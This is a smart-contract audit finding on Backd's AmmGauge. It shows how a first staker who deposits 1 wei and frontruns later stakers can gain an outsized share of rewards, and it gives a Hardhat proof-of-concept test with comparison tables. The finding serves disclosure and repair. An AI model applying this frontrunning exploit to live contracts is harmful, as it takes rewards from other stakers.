## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- sponsor confirmed

# [THE FIRST AMM STAKER WILL HAVE CONTROL OVER HOW THE SHARES ARE CALCULATED](https://github.com/code-423n4/2022-05-backd-findings/issues/100) 

# Lines of code

https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L147
https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L154


# Vulnerability details

## Impact
The first staker can take control of how the subsequent shares are going to be distributed by simply staking 1wei amount of the token and frontrunning future stakers. The reasons of this are related on how the variables are updated and with the amounts that the Gauge allows users to stake (anything but zero). The origin of this vulnerability relies on the evaluation of the `totalStaked` variable on its inception.

## Proof of Concept
To illustrate this attack an environment of testing was made in order to track the token flows and how the variables are being updated and read.

The initial or border conditions taken into account are the same as the used by the team to perform the tests and just a few assumptions and simplifications were taken.

1) The inflation rate is fixed for simplicity (`0.001`). This is valid within a short period of time because it is not a function of how the tokens are distributed or their flows. By tracking how the inflation rate is calculated an updated, we see that it is managed by the `currentInflationAmountAmm` within the [`Minter.sol` contract](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L184), which value is modified by `_executeInflationRateUpdate()` three lines below the last code permalink. Its value depends on non-token balance related parameters (such as inflation decays and annual rates).
2) For the testing environment performed by the team, a DummyERC20 was used as testing token. The same is done on the exploit environment.
3) The controller is not used because it is used to retrieve the inflation rate and it is now fixed because of 1).

Each user state is updated whenever he calls either `stake`, `unstake` or `claimRewards`.

Steps:
- Alice is the first staker and deposits 1wei worth of DummyERC20.
- Bob takes one day to find out this new protocol and decides to stake 10 ETH amount of tokens (`10 * 10**decimals()`).
- Alice, who was scanning the mempool, frontruns Bob with the same amount he was willing to stake. Her txn is mined first.
- Then Bobs' transaction is mined for the 10 ETH worth.
- Sometime after this, the pool is checkpointed.
- A few days pass, and Bob wants to stake even more tokens. The same amount as before.
- Alice frontruns him again updating her shares.
- Bobs' transaction is mined and his shares are also updated.
- The pool is checkpointed again. And Alice managed to increase considerably her amount of shares.

Both cases were evaluated (with and without staking 1 wei first). The attack scenario outputs a 100% more shares to Alice than Bob in comparison with the ethical/non-attack situation.

The code used to perform this test is the following:

    it("First Depositer Exploit", async function () {
            let userShares = []
            let userIntegral = []
            let userBalance = []

            let globalIntegral, totalStaked;
            let aliceBob = [alice, bob];

            // Starting Checkpoint
            await this.ammgauge.poolCheckpoint();
            await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 10 days
            
            const updateStates = async () => { 
                userShares = []
                userIntegral = []
                userBalance = []
                for (const user of aliceBob) {
                    let balances = ethers.utils.formatEther(await this.ammgauge.balances(user.address));
                    let currentShare = ethers.utils.formatEther(await this.ammgauge.perUserShare(user.address));
                    let currentStakedIntegral = ethers.utils.formatEther(await this.ammgauge.perUserStakedIntegral(user.address));
                    userShares.push(currentShare);
                    userIntegral.push(currentStakedIntegral);
                    userBalance.push(balances);
                }
                globalIntegral = await this.ammgauge.ammStakedIntegral()
                totalStaked = await this.ammgauge.totalStaked()
                console.log("  ")
                console.log("         ALICE / BOB");
                console.log(`Shares: ${userShares}`);
                console.log(`Integr: ${userIntegral}`);
                console.log(`Balanc: ${userBalance}`);
                console.log("  ")
                console.log("Global")
                console.log(`Integral: ${ethers.utils.formatEther(globalIntegral)}, TotalStaked: ${ethers.utils.formatEther(totalStaked)}`)
            }

            const stake = async (to, amount) => {
                await updateStates()
                console.log(" ")
                // Balance before
                let balanceBefore = await this.ammgauge.balances(to.address);
                // Stake
                await this.ammgauge.connect(to).stake(amount);
                expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.add(amount));
                // await updateStates();
                console.log(" ")
            }

            const unstake = async (to, amount) => {
                await updateStates()
                console.log(" ")
                // Balance before
                let balanceBefore = await this.ammgauge.balances(to.address);
                // Stake
                await this.ammgauge.connect(to).unstake(amount);
                expect(await this.ammgauge.balances(to.address)).to.be.eq(balanceBefore.sub(amount));
                await updateStates();
                console.log(" ")
            }

            // HERE IS WHERE THE SIMULATION IS PERFORMED
            let simulationTimes = 2;
            let withOneWeiDeposit = true;

            if (withOneWeiDeposit) {
                // Alice deposits first
                console.log("Alice Deposits 1wei")
                let firstUserDeposit = ethers.utils.parseEther("1");
                await stake(alice, 1);
            }

            for (let index = 1; index <= simulationTimes; index++) {
                console.log(" ")
                console.log(`Loop number ${index}`);
                console.log(" ")

                console.log("A day passes until Bob decides to deposit")
                await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 days

                console.log(" ")
                console.log("She scans that Bob is about to stake 10. So decides to frontrun him.")
                console.log("Alice Frontruns")
                let frontrunAmount = ethers.utils.parseEther("10");
                await stake(alice, frontrunAmount);

                console.log(" ")
                console.log("Bob stakes 10 tokens")
                await stake(bob, frontrunAmount)

                // A few days pass
                await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 2 days
                // The pool is checkpointed
                await this.ammgauge.poolCheckpoint();
                console.log("After 1 day the pool is checkpointed")
                await updateStates()

            }
        })

The simulation was both made for the attacked and non attacked situations.
The values that are shown represent how the contract updates them (the `totalStaked` variable is 0 when first Alice calls the stake function after `_userCheckpoint()` rans)

### WITH 1WEI STAKE (ATTACK)


| time |                Situation               |  totalStaked  | Alice Shares | Bob Shares |
|:----:|:--------------------------------------:|:-------------:|:------------:|:----------:|
|  0-  |          First poolCheckpoint          |       0       |       0      |      0     |
|  0+  |           Alice Deposits 1wei          |       0       |       0      |      0     |
|   1  |       Alice frontruns Bob @ 10eth      |      1wei     |       0      |      0     |
|   2  |         Bob 10eth txn is mined         |  10eth + 1wei |     86.4     |      0     |
|   3  | 1 day later poolCheckpoint() is called | 20eth + 1 wei |     86.4     |      0     |
|   4  |        Alice frontruns Bob again       | 20eth + 1 wei |     86.4     |      0     |
|   5  |         Bob 10eth txn is mined         |  30eth + 1wei |     172.8    |      0     |
|   6  | 1 day later poolCheckpoint() is called |  40eth + 1wei |     172.8    |    86.4    |

### WITHOUT THE 1WEI STAKE (No "first staker hijack")

| time |                Situation               | totalStaked | Alice Shares | Bob Shares |
|:----:|:--------------------------------------:|:-----------:|:------------:|:----------:|
|  0-  |          First poolCheckpoint          |      0      |       0      |      0     |
|  0+  |           Alice stakes 10eth           |      0      |       0      |      0     |
|   1  |            Bob stakes 10eth            |    10eth    |       0      |      0     |
|   2  | 1 day later poolCheckpoint() is called |    20eth    |       0      |      0     |
|   3  |           Alice stakes 10eth           |    20eth    |       0      |      0     |
|   4  |            Bob stakes 10eth            |    30eth    |     86.4     |      0     |
|   5  | 1 day later poolCheckpoint() is called |    40eth    |     86.4     |    86.4    |


## Recommended Mitigation Steps
Further evaluation on how the variables are updated and how does the `Integral` (both each users and global one) is calculated on the pool inception is needed to patch this issue.

